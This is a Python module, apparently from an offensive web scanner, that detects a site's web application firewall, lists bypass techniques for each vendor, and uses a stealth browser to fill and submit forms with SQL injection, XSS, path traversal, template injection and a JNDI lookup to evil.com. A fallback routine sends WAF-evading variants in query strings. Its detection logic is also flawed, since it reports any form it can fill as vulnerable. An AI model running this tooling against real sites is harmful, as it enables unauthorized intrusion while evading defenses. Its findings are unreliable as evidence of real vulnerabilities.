# modules/evasion.py
from typing import List, Dict, Optional, Union, Tuple, Any
from modules.base import BaseModule
from core.waf_evader import SmartWAFEvader
from core.stealth_browser import StealthBrowser
import asyncio
import json

class EvasionModule(BaseModule):
    
    MODULE_NAME = "evasion"
    MODULE_DESCRIPTION = "WAF evasion and stealth scanning"
    
    async def run(self) -> Dict[str, Any]:
    
        self.logger.info("تشغيل وحدة التهرب المتقدم")
        
        results = {
            'waf_detected': None,
            'evasion_success': False,
            'vulnerabilities_found': [],
            'stealth_data': {},
            'waf_bypass_techniques': [],
            'notes': []
        }
        
        waf_evader = SmartWAFEvader()
        
        # Phase 1: WAF Detection (passive)
        try:
            response = await self.http_client.get(self.config.get('target'))
            waf_type = await waf_evader.detect_waf(dict(response.headers))
            
            if waf_type:
                results['waf_detected'] = waf_type
                self.logger.info(f"تم اكتشاف WAF: {waf_type}")
                
                # Get bypass techniques even if stealth browser fails
                bypass_techniques = self._get_bypass_techniques({waf_type})
                results['waf_bypass_techniques'] = bypass_techniques
        except Exception as e:
            self.logger.error(f"خطأ في اكتشاف WAF: {e}")
        
        # Phase 2: Stealth Browser Testing (only if mode requires it)
        if self.config.get('scan.mode') in ['deep', 'ai']:
            self.logger.info("محاولة تهيئة المتصفح المتخفي...")
            stealth_browser = StealthBrowser(self.config)
            
            browser_initialized = await stealth_browser.initialize()
            
            if browser_initialized:
                self.logger.info("✅ تم تهيئة المتصفح المتخفي بنجاح")
                try:
                    page_data = await stealth_browser.stealth_navigate(
                        self.config.get('target')
                    )
                    
                    if page_data:
                        results['stealth_data'] = page_data
                        
                        forms = page_data.get('forms', [])
                        links = page_data.get('links', [])
                        
                        self.logger.info(f"تم جمع {len(forms)} نموذج و {len(links)} رابط")
                        
                        # Test forms using stealth browser
                        vulnerabilities = await self.test_forms_stealth(
                            forms, 
                            waf_evader, 
                            stealth_browser
                        )
                        
                        results['vulnerabilities_found'].extend(vulnerabilities)
                        results['evasion_success'] = True
                    else:
                        results['notes'].append("Stealth navigation returned no data")
                
                except Exception as e:
                    self.logger.error(f"خطأ أثناء التصفح المتخفي: {e}")
                    results['notes'].append(f"Stealth navigation error: {str(e)}")
                
                finally:
                    await stealth_browser.cleanup()
            else:
                # Browser initialization failed - use fallback methods
                self.logger.warning("⚠️ فشل تهيئة المتصفح المتخفي، الانتقال للطرق البديلة")
                results['notes'].append("Stealth browser initialization failed - using fallback methods")
                
                # Fallback: Use basic HTTP-based evasion tests
                fallback_vulns = await self._run_fallback_evasion_tests(waf_evader)
                results['vulnerabilities_found'].extend(fallback_vulns)
                results['evasion_success'] = len(fallback_vulns) > 0
        
        return results
    
    def _escape_javascript_string(self, s: str) -> str:

        if not isinstance(s, str):
            s = str(s)
        return s.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r")
    
    async def test_forms_stealth(self, forms, waf_evader, stealth_browser):

        vulnerabilities = []
        
        if not forms:
            return vulnerabilities
        
        for form in forms:
            if not form.get('action'):
                continue
                
            form_url = form['action']
            if not form_url.startswith('http'):
                form_url = self.config.get('target') + form_url
            
            for input_field in form.get('inputs', []):
                if not input_field.get('name'):
                    continue

                try:
                    payloads = await self.generate_evasive_payloads(
                        input_field['name'],
                        waf_evader
                    )
                    
                    for payload in payloads:
                        try:
                            # Escape strings for JavaScript
                            safe_form_action = self._escape_javascript_string(form['action'])
                            safe_input_name = self._escape_javascript_string(input_field['name'])
                            
                            # Use JSON.stringify for the payload to handle special characters safely
                            js_code = f"""
                                (function() {{
                                    try {{
                                        const form = document.querySelector('form[action="{safe_form_action}"]');
                                        if (form) {{
                                            const input = form.querySelector('[name="{safe_input_name}"]');
                                            if (input) {{
                                                input.value = {json.dumps(payload)};
                                                input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                                input.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                                return "input_set";
                                            }}
                                            return "input_not_found";
                                        }}
                                        return "form_not_found";
                                    }} catch (e) {{
                                        return "error: " + e.message;
                                    }}
                                }})()
                            """
                            
                            result = await stealth_browser.execute_javascript(js_code)
                            
                            if result and 'input_set' in str(result):
                                # Try to submit the form
                                submit_js = f"""
                                    (function() {{
                                        try {{
                                            const form = document.querySelector('form[action="{safe_form_action}"]');
                                            if (form) {{
                                                form.submit();
                                                return "submitted";
                                            }}
                                            return "form_gone";
                                        }} catch (e) {{
                                            return "error: " + e.message;
                                        }}
                                    }})()
                                """
                                await stealth_browser.execute_javascript(submit_js)
                                
                                vulnerabilities.append({
                                    'type': 'form_injection',
                                    'form': form_url,
                                    'field': input_field['name'],
                                    'payload': payload,
                                    'technique': 'stealth_form_submission'
                                })
                            
                        except Exception as e:
                            self.logger.debug(f"خطأ في اختبار البايلود {payload[:30]}: {e}")
                            
                except Exception as e:
                    self.logger.error(f"خطأ في اختبار النموذج: {e}")
        
        return vulnerabilities
    
    async def _run_fallback_evasion_tests(self, waf_evader) -> List[Dict]:

        vulnerabilities = []
        
        self.logger.info("تشغيل اختبارات التهرب البديلة...")
        
        try:
            # Test 1: Basic WAF evasion with encoded payloads
            test_payloads = [
                ("<script>alert(1)</script>", "xss"),
                ("' OR '1'='1", "sqli"),
                ("../../../etc/passwd", "lfi"),
            ]
            
            for payload, vuln_type in test_payloads:
                try:
                    # Apply evasion techniques
                    evaded_payloads = await waf_evader.evade_payload(payload, waf_evader.detected_waf)
                    
                    for evaded in evaded_payloads[:3]:  # Test first 3 variants
                        test_url = f"{self.config.get('target')}?test={evaded}"
                        
                        try:
                            response = await self.http_client.get(test_url, timeout=10)
                            
                            # Check if WAF blocked it
                            if response.status not in [403, 406, 501]:
                                vulnerabilities.append({
                                    'type': f'{vuln_type}_evasion_test',
                                    'payload': evaded,
                                    'status_code': response.status,
                                    'technique': 'http_based_evasion',
                                    'note': 'Payload not blocked by WAF'
                                })
                                
                        except Exception as e:
                            self.logger.debug(f"Fallback test failed for payload: {e}")
                            
                except Exception as e:
                    self.logger.debug(f"Evasion generation failed: {e}")
        
        except Exception as e:
            self.logger.error(f"Fallback evasion tests failed: {e}")
        
        self.logger.info(f"تم العثور على {len(vulnerabilities)} نتائج في الاختبارات البديلة")
        return vulnerabilities
    
    def _get_bypass_techniques(self, waf_names: set) -> List[str]:


        techniques = []
        
        bypass_db = {
            'Cloudflare': [
                'Use cloudfront domains as origin',
                'Lower case conversion',
                'Unicode normalization',
                'Request smuggling techniques'
            ],
            'ModSecurity': [
                'URL encoding variations',
                'Unicode encoding',
                'Comment injection',
                'Whitespace substitution'
            ],
            'Incapsula': [
                'IP rotation',
                'Request rate limiting',
                'Header manipulation',
                'Cookie handling'
            ],
            'AWS WAF': [
                'Size constraint bypass',
                'Encoding variations',
                'Header order manipulation'
            ],
            'default': [
                'URL encoding (single/double)',
                'Unicode normalization',
                'Case variation',
                'Comment injection',
                'Whitespace manipulation',
                'HTTP parameter pollution'
            ]
        }
        
        for waf in waf_names:
            if waf in bypass_db:
                techniques.extend(bypass_db[waf])
            else:
                techniques.extend(bypass_db['default'])
        
        return list(set(techniques))
    
    async def generate_evasive_payloads(self, field_name, waf_evader):

        payloads = []
        
        field_lower = field_name.lower()
        
        if any(keyword in field_lower for keyword in ['user', 'name', 'email']):
            basic_payloads = ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"]
        
        elif any(keyword in field_lower for keyword in ['id', 'num', 'code']):
            basic_payloads = ["1 OR 1=1", "999 UNION SELECT 1,2,3", "1; SELECT SLEEP(5)"]
        
        elif any(keyword in field_lower for keyword in ['file', 'path', 'url']):
            basic_payloads = ["../../../etc/passwd", "php://filter", "http://evil.com"]
        
        else:
            basic_payloads = [
                "<script>alert(1)</script>",
                "' OR '1'='1",
                "${jndi:ldap://evil.com}",
                "{{7*7}}"
            ]
        
        for payload in basic_payloads:
            try:
                evaded = await waf_evader.evade_payload(payload, waf_evader.detected_waf)
                payloads.extend(evaded)
            except Exception as e:
                self.logger.debug(f"Failed to evade payload {payload}: {e}")
                payloads.append(payload)
        
        return list(set(payloads))[:10]
